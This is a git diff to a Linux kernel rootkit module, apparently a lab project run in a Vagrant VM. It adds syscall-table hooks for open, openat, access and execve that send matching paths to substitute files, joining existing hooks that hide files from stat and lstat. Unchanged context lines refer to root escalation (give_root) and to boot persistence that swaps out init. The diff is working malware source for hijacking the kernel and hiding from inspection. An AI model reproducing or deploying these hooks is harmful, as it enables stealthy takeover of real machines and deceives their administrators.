@@ -7,6 +7,7 @@
 #include <linux/dirent.h>
 #include <linux/uaccess.h>
 #include <linux/namei.h>
+#include <linux/errno.h>
 
 #include "modify_syscalls.h"
 
@@ -40,13 +41,17 @@ char hidePID[6] = "-1";
 #define FILE_INIT_REPLACEMENT_C "/vagrant/start_rootkit.c"
 // #define FILE_INIT               "/sbin/init"
 // #define FILE_INIT_ORIGINAL      "/sbin/init_original"
-
 // #define FILE_INIT               "/vagrant/init_temp"
 // #define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
-
 #define FILE_INIT               "/home/vagrant/fake_init"
 #define FILE_INIT_ORIGINAL      "/home/vagrant/fake_init_original"
 
+// 'map' for replacement open operations
+// e.g. trying to open dog.txt will get you red.txt instead
+// use linked list instead?
+const int   replacement_size     = 2;
+const char* replacement_keys[]   = { "/home/vagrant/redirect/dog.txt\0", "/home/vagrant/redirect/cat.txt\0" };
+const char* replacement_values[] = { "/home/vagrant/redirect/red.txt\0", "/home/vagrant/redirect/blue.txt\0" };
 
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
@@ -54,6 +59,10 @@ asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
+asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
+asmlinkage int (*original_openat)(int dirfd, const char* pathname, int flags, mode_t mode);
+asmlinkage int (*original_access)(const char *pathname, int mode);
+asmlinkage int (*original_execve)(const char *pathname, char* const argv[], char* const envp[]);
 
 struct list_head *module_list;
 
@@ -69,6 +78,14 @@ void update_sys_calls(void **sys_call_table){
     void *modified_function_stat = hacked_stat;
     void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
     void *modified_function_lstat = hacked_lstat;
+    void **modified_at_address_open = &sys_call_table[__NR_open];
+    void *modified_function_open = hacked_open;
+    void **modified_at_address_access = &sys_call_table[__NR_access];
+    void *modified_function_access = hacked_access;
+    void **modified_at_address_openat = &sys_call_table[__NR_openat];
+    void *modified_function_openat = hacked_openat;
+    void **modified_at_address_execve = &sys_call_table[__NR_execve];
+    void *modified_function_execve = hacked_execve;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -76,6 +93,10 @@ void update_sys_calls(void **sys_call_table){
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
+    original_open = xchg(modified_at_address_open, modified_function_open);
+    // original_access = xchg(modified_at_address_access, modified_function_access);
+    // original_openat = xchg(modified_at_address_openat, modified_function_openat);
+    // original_execve = xchg(modified_at_address_execve, modified_function_execve);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -90,6 +111,14 @@ void revert_to_original(void **sys_call_table){
     void *modified_function_stat = original_stat;
     void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
     void *modified_function_lstat = original_lstat;
+    void **modified_at_address_open = &sys_call_table[__NR_open];
+    void *modified_function_open = original_open;
+    void **modified_at_address_access = &sys_call_table[__NR_access];
+    void *modified_function_access = original_access;
+    void **modified_at_address_openat = &sys_call_table[__NR_openat];
+    void *modified_function_openat = original_openat;
+    void **modified_at_address_execve = &sys_call_table[__NR_execve];
+    void *modified_function_execve = original_execve;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -97,6 +126,10 @@ void revert_to_original(void **sys_call_table){
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
+    original_open = xchg(modified_at_address_open, modified_function_open);
+    // original_access = xchg(modified_at_address_access, modified_function_access);
+    // original_openat = xchg(modified_at_address_openat, modified_function_openat);
+    // original_execve = xchg(modified_at_address_execve, modified_function_execve);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -190,22 +223,142 @@ const char* strip_filepath(const char* filepath) {
 // NOTE: this does not append 'No such file or directory' to the end;
 // is the error code return working?
 asmlinkage int hacked_stat(const char *path, struct stat *buf) {
+    int i;
     const char* filename = strip_filepath(path);
     if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
         return -ENOENT;
     } else {
+        // check for replacement as well
+        for (i = 0; i < replacement_size; i++) {
+            // check if pathname is in map
+            if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+                // redirect to replacement file
+                printk("tried to stat %s; redirecting stat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
+                return original_stat(replacement_values[i], buf);
+            }
+        }
+
         return original_stat(path, buf);
     }
 }
 
 asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
+    int i;
     const char* filename = strip_filepath(path);
     if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
         return -ENOENT;
     } else {
+        // check for replacement as well
+        for (i = 0; i < replacement_size; i++) {
+            // check if pathname is in map
+            if (strncmp(path, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+                // redirect to replacement file
+                printk("tried to lstat %s; redirecting lstat from %s to %s...\n", path, replacement_keys[i], replacement_values[i]);
+                return original_stat(replacement_values[i], buf);
+            }
+        }
+
         return original_lstat(path, buf);
     }
 }
+
+asmlinkage int hacked_open(const char* pathname, int flags, mode_t mode) {
+    // this can use relative path as well so we need to check only the filename.
+    // probs not great
+    const char* pathname_stripped = strip_filepath(pathname);
+
+    // const char* to_send_ex = {'/', 'h', 'o', 'm', 'e',
+    //                           '/', 'v', 'a', 'g', 'r', 'a', 'n', 't',
+    //                           '/', 'r', 'e', 'd', 'i', 'r', 'e', 'c', 't',
+    //                           '/', 'd', 'o', 'g', '.', 't', 'x', 't'};
+
+    // const char* to_send_ex = {'d', 'o', 'g', '.', 't', 'x', 't'};
+
+    int i;
+    for (i = 0; i < replacement_size; i++) {
+        // check if pathname is in map
+        const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
+        if (strncmp(pathname, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
+            // const char* replacement_value_stripped = strip_filepath(replacement_values[i]);
+            // redirect to replacement file
+            printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+
+            printk("pathname: %s\n", pathname);
+            int j;
+            for (j = 0; j < 200; j++) {
+                printk("%c,", pathname[j]);
+            }
+            printk("\n");
+
+            // int fd = original_open(to_send_ex, flags, mode);
+            int fd = original_open(replacement_values[i], flags, mode);
+            // int fd = original_open("/home/vagrant/banana", flags, mode | O_CREAT);
+            // perror("open");
+            printk("new fd is: %d\n", fd);
+            // printk("EISDIR is: %d\n", EISDIR);
+            return fd;
+        }
+    }
+
+    int fd = original_open(pathname, flags, mode);
+    printk("new (original) fd is: %d\n", fd);
+    // printk("error: %d\n", errno);
+    return fd;
+}
+
+asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
+    // const char* filename = strip_filepath(pathname);
+    // int i;
+    // for (i = 0; i < replacement_size; i++) {
+    //     const char* replacement_stripped = strip_filepath(replacement_keys[i]);
+    //     // check if pathname is in map
+    //     if (strncmp(filename, replacement_stripped, strlen(replacement_stripped)) == 0) {
+    //         const char* replacement_value_stripped = strip_filepath(replacement_values[i]);
+    //         // redirect to replacement file
+    //         printk("tried to openat %s; redirecting openat from %s to %s...\n", pathname, replacement_stripped, replacement_value_stripped);
+    //         return original_openat(dirfd, replacement_value_stripped, flags, mode);
+    //     } else {
+    //         printk("openat: %s & %s didn't compare\n", filename, replacement_stripped);
+    //     }
+    // }
+
+    return original_openat(dirfd, pathname, flags, mode);
+}
+
+asmlinkage int hacked_access(const char* pathname, int mode) {
+    int i;
+    for (i = 0; i < replacement_size; i++) {
+        // check if pathname is in map
+        if (strncmp(pathname, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+            // redirect to replacement file
+            printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+            return original_access(replacement_values[i], mode);
+        }
+    }
+
+    return original_access(pathname, mode);
+}
+
+asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]) {
+    int i;
+    for (i = 0; i < replacement_size; i++) {
+        // check if pathname is in map
+        if (strncmp(pathname, replacement_keys[i], strlen(replacement_keys[i])) == 0) {
+            // redirect to replacement file
+            printk("tried to execve %s; redirecting execve from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+            return original_execve(replacement_values[i], argv, envp);
+        }
+    }
+
+    return original_execve(pathname, argv, envp);
+}
+
+
+// stat takes pathname
+// + execve
+// + access
+
+
 
 void give_root(void)
 {
@@ -513,6 +666,8 @@ void add_to_reboot(void **sys_call_table) {
     // vfs_stat("/home/vagrant/dog.txt", &file_stat);
     // printk("file_stat.mode: %o\n", file_stat.mode);
     // printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
+
+    // REALLY NEED to check if file exists!
 
     int ret;
 
